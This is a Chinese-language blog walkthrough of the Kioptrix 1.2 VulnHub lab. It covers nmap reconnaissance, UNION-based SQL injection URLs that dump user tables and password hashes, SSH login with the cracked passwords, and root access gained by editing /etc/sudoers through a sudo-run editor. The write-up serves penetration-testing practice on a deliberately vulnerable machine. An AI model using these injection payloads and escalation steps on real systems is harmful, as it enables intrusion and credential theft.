---
title: Kioptrix-1.2
author: Creexile
date: 2025-06-15 18:40:46
lastMod: 2025-06-15
summary: 'easyNo.16'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [SQL注入, 提权, 渗透]
---

# Kioptrix: 1.2

---

> 来源: [vulnhub靶场-Kioptrix: 1.2](https://www.vulnhub.com/entry/kioptrix-level-12-3,24/)
>
> 目标: 也许是get root
>
> 提示: Important thing with this challenge. Once you find the IP (DHCP Client) edit your hosts file and point it to kioptrix3.com
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.110.130
- target: 192.168.110.132

注意要将ip指向域名`kioptrix3.com`, 修改`/etc/hosts`

## 信息收集

```bash
# 获取靶机地址 192.168.110.132
sudo nmap -sn 192.168.110.0/24
# 获取端口信息 22,80
sudo nmap -sT --min-rate 10000 -p- 192.168.110.132 -oA scan/ports
# 获取详细信息
sudo nmap -sT -sV -sC -O -p22,80 192.168.110.132 -oA scan/detail
# 看看漏洞
sudo nmap --script=vuln -p22,80 192.168.110.132 -oA scan/vuln
```

目录扫描

```
/core
/cache
/favicon.ico
/gallery
/modules
/phpmyadmin
/update.php
```

后台登录 , 尝试`admin : admin`, 失败
phpmyadmin, 尝试`root : `, 失败
update.php, permission denied

还是来看看lotuscms的漏洞吧,

经过测试确实存在sql注入漏洞, 当输入`order by 7`出现报错, 所以是6列

```
# 判断列数
http://kioptrix3.com/gallery/gallery.php?id=-1 order by 7 --
# 判断显示位
http://kioptrix3.com/gallery/gallery.php?id=-1 union select 1,2,3,4,5,6 --
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250615201714.png)

```
# 看看数据库 gallery
http://kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,database(),4,5,6 --

# 看看表名 gallarific_users, dev_accounts
http://kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='gallery'),4,5,6--

# 看看表内字段名 username, password
http://kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='gallarific_users'),4,5,6 --

# 看看内容
http://kioptrix3.com/gallery/gallery.php?id=1 union select 1,2,(select group_concat(username,'-',password) from gallery.dev_accounts),4,5,6--
```

`dreg-0d3eccfb887aabd50f243b3f155c0f85`
`loneferret-5badcaf789d3d1d09794d8f021f40f0e`

查询到了两个账号和它们对应密码的MD5加密密文, 通过在线网站解密

`dreg : Mast3r`, `loneferret : starwars`

> 找到的文章就是用的这个靶机做例子说的lotusCMS的sql注入

## getshell

拿到的账密无法用于登录网站后台, 但是dreg可以用于登录ssh

```bash
ssh -oHostKeyAlgorithms=ssh-rsa,ssh-dss dreg@192.168.110.132
```

## 信息收集

bash进入存在限制, 不过好在可以使用python

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
# 系统信息 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
uname -a
# 内核版本 2.6.24-24-server
uname -r
# 查看发行版的信息, Ubuntu 8.04.3 LTS
lsb_release -a
# 查看环境
python -h
gcc -v
# 查看权限, 无
sudo -l
# 查看特权文件, 无发现
find / -perm -u=s -type f 2>/dev/null
# 看看计划任务, 无发现
cat /etc/crontab
```

前往`/usr/lonefeerret`目录, 找到一个可疑的sh程序, 查看旁边的README

```
你好，新员工，
使用我们新安装的软件编辑、创建和查看文件是公司的政策。
请使用命令“sudo ht”。
如果不这样做，你将被立即解雇。

DG
首席执行官
```

运行, 发现报错, 寻找解决方法

```bash
# Error opening terminal: xterm-256color.
export TERM=xterm
```

现在发现一个问题, ht这个编辑器是使用sudo执行的, 所以我们可以将这个用户的sudo权限修改成和root相同的

**sudo执行命令的流程 **

当用户执行sudo时，系统会主动寻找`/etc/sudoers`文件，判断该用户是否有执行sudo的权限
-->确认用户具有可执行sudo的权限后，让用户输入用户自己的密码确认
-->若密码输入成功，则开始执行sudo后续的命令

所以直接修改`/etc/sudoers`即可

## 提权

刚执行完`sudo ht`, 使用F3打开`/etc/sudoers`文件并进行编辑, 给他改成这样

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250616110848.png)

`F2`保存即可, 回去试试`sudo -l`, 不用想肯定是ALL, 那就已经结束辣

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250616111404.png)

# 其他

在`/home/www/kioptrix3.com/gallery`目录下有个`gconfig.php`, 里面有数据库交互的账号密码

`root : fuckeyou`
